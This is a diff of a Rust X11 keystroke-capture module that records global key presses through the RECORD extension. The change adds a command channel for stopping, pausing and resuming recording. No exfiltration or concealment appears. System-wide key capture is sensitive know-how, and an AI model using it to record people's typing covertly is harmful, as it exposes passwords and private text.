@@ -5,8 +5,7 @@ use std::process::Command;
 use std::str;
 use std::sync::{
     atomic::{AtomicBool, Ordering},
-    Arc,
-    Mutex,
+    Arc, Mutex,
 };
 use std::thread;
 
@@ -15,20 +14,23 @@ use x11rb::protocol::record::{self, ConnectionExt as _, Range8, CS};
 use x11rb::protocol::xproto;
 use x11rb::x11_utils::TryParse;
 
-use super::super::observers::pub_sub::Subscriber;
-use super::super::observers::pub_sub::Publisher;
-use super::super::observers::pub_sub::BasicPublisher;
-use super::super::observers::pub_sub::Event;
+use crate::observers::pub_sub::BasicPublisher;
+use crate::observers::pub_sub::Event;
+use crate::observers::pub_sub::Publisher;
+use crate::observers::pub_sub::Subscriber;
+
+use crate::command_dispatcher::{CommandDispatcher, KeyloggerCommand};
+use std::sync::mpsc::{Receiver, TryRecvError};
 
 pub struct XKeylogger {
-    exit_flag: Arc<AtomicBool>,
     handle: Option<thread::JoinHandle<Vec<KeyRecord>>>,
     keymap: HashMap<u8, Vec<String>>,
-    publisher: Arc<Mutex<BasicPublisher<KeyRecord>>>
+    publisher: Arc<Mutex<BasicPublisher<KeyRecord>>>,
+    receiver: Arc<Mutex<Receiver<KeyloggerCommand>>>,
 }
 
 impl XKeylogger {
-    pub fn new() -> Result<Self, &'static str> {
+    pub fn new(receiver: Arc<Mutex<Receiver<KeyloggerCommand>>>) -> Result<Self, &'static str> {
         let keymap = match get_keycode_keysym_pairs() {
             Ok(map) => map,
             Err(_) => {
@@ -38,10 +40,10 @@ impl XKeylogger {
         };
 
         Ok(XKeylogger {
-            exit_flag: Arc::new(AtomicBool::new(false)),
             handle: None,
             keymap,
-            publisher: Arc::new(Mutex::new(BasicPublisher::new()))
+            publisher: Arc::new(Mutex::new(BasicPublisher::new())),
+            receiver,
         })
     }
 }
@@ -53,9 +55,8 @@ impl Keylogger for XKeylogger {
             return Err("keylogger is already recording");
         }
 
-        self.exit_flag.store(false, Ordering::Relaxed);
-
-        let exit_flag = Arc::clone(&self.exit_flag);
+        // let receiver = Arc::clone(&self.receiver);
+        let receiver = self.receiver.clone();
         let keymap = self.keymap.clone();
         let publisher = Arc::clone(&self.publisher);
         let handle = thread::spawn(move || {
@@ -103,8 +104,44 @@ impl Keylogger for XKeylogger {
 
             let mut keys: Vec<KeyRecord> = Vec::new();
 
+            // we don't care if the receiver is locked, because we use it only here
+            let mut receiver = match receiver.lock() {
+                Ok(rx) => rx,
+                Err(e) => {
+                    log::error!("Cannot lock receiver: {e}");
+                    panic!();
+                }
+            };
+
+            let receiver = &mut *receiver;
+            let mut is_paused = false;
+
             // do until exit_flag doesn't change (only changes through stop func)
-            while !exit_flag.load(Ordering::SeqCst) {
+            loop {
+                match receiver.try_recv() {
+                    Ok(cmd) => {
+                        log::info!("Received keylogger command: {:?}", cmd);
+                        match cmd {
+                            KeyloggerCommand::StopRecording => {
+                                break;
+                            }
+                            KeyloggerCommand::PauseRecording => {
+                                is_paused = true;
+                                //conn.record_disable_context(rc);
+                            }
+                            KeyloggerCommand::ResumeRecording => {
+                                is_paused = false;
+                                //event_stream = conn.record_enable_context(rc).unwrap();
+                            }
+                            _ => (),
+                        }
+                    }
+                    Err(TryRecvError::Empty) => (),
+                    Err(TryRecvError::Disconnected) => {
+                        log::info!("Channel disconnected.");
+                        break;
+                    }
+                }
                 match event_stream.next() {
                     Some(Ok(reply)) => {
                         if reply.category == 0 {
@@ -114,8 +151,8 @@ impl Keylogger for XKeylogger {
                                 // Modifiers are automatically detected, we
                                 // don't need to add a separate keyevent for
                                 // them
-                                if (is_modifier_key(event.detail)) {
-                                    continue  
+                                if is_modifier_key(event.detail) {
+                                    continue;
                                 }
 
                                 let key_name = keymap.get(&event.detail);
@@ -130,7 +167,9 @@ impl Keylogger for XKeylogger {
                                             key_code: event.detail,
                                         };
 
-                                        keys.push(key_record.clone());
+                                        if !is_paused {
+                                            keys.push(key_record.clone());
+                                        }
 
                                         match publisher.lock() {
                                             Ok(observer) => {
@@ -138,13 +177,11 @@ impl Keylogger for XKeylogger {
                                                 // notify calls subscriber function, so they must
                                                 // finish as well.
                                                 observer.notify(&Event::KeyPress, &key_record)
-                                            },
+                                            }
                                             Err(_) => {
                                                 log::error!("Cannot send KeyPress notification. Publisher is already locked");
                                             }
                                         };
-
-
                                     }
                                     None => continue, // UNKNOWN KEY
                                 };
@@ -174,7 +211,15 @@ impl Keylogger for XKeylogger {
     }
 
     fn stop(&mut self) -> Result<Vec<KeyRecord>, &'static str> {
-        self.exit_flag.store(true, Ordering::Relaxed);
+        match CommandDispatcher::get().send_command(KeyloggerCommand::StopRecording) {
+            Ok(_) => (),
+            Err(e) => {
+                let msg = "Failed to send keylogger stop command";
+                log::error!("{msg}: {e}");
+                return Err("{msg}");
+            }
+        }
+
         let handle = match self.handle.take() {
             Some(h) => h,
             None => {
@@ -200,9 +245,8 @@ impl Publisher<KeyRecord> for XKeylogger {
             Ok(publisher) => publisher,
             Err(_) => {
                 log::error!("Cannot add subscriber. Publisher is locked");
-                return
+                return;
             }
-
         };
 
         observer.subscribe(event, listener)
@@ -213,9 +257,8 @@ impl Publisher<KeyRecord> for XKeylogger {
             Ok(publisher) => publisher,
             Err(_) => {
                 log::error!("Cannot add subscriber. Publisher is locked");
-                return
+                return;
             }
-
         };
 
         observer.unsubscribe(event, listener)
@@ -226,9 +269,8 @@ impl Publisher<KeyRecord> for XKeylogger {
             Ok(publisher) => publisher,
             Err(_) => {
                 log::error!("Cannot add subscriber. Publisher is locked");
-                return
+                return;
             }
-
         };
 
         observer.notify(event, data)
@@ -282,21 +324,21 @@ fn get_keycode_keysym_pairs() -> Result<HashMap<u8, Vec<String>>, &'static str> 
 // TODO: use something like this to make modifier enum and use that instead of string for modifiers
 fn is_modifier_key(key_code: u8) -> bool {
     match key_code {
-        0x32 => true,  // Shift_L
-        0x3e => true,  // Shift_R
-        0x25 => true,  // Control_L
-        0x69 => true,  // Control_R
-        0x40 => true,  // ALT_L
-        0x6c => true,  // ALT_R
-        0xcc => true,  // ALT_L again
-        0xcd => true,  // Meta_L
-        0x4d => true,  // Num_Lock
-        0xcb => true,  // ISO_Level5_Shift
-        0xcf => true,  // Hyper_L
-        0x85 => true,  // Super_L
-        0x86 => true,  // Super_R
-        0xce => true,  // Super_L again
-        0x5c => true,  // ISO_Level3_Shift
-        _ => false 
+        0x32 => true, // Shift_L
+        0x3e => true, // Shift_R
+        0x25 => true, // Control_L
+        0x69 => true, // Control_R
+        0x40 => true, // ALT_L
+        0x6c => true, // ALT_R
+        0xcc => true, // ALT_L again
+        0xcd => true, // Meta_L
+        0x4d => true, // Num_Lock
+        0xcb => true, // ISO_Level5_Shift
+        0xcf => true, // Hyper_L
+        0x85 => true, // Super_L
+        0x86 => true, // Super_R
+        0xce => true, // Super_L again
+        0x5c => true, // ISO_Level3_Shift
+        _ => false,
     }
 }
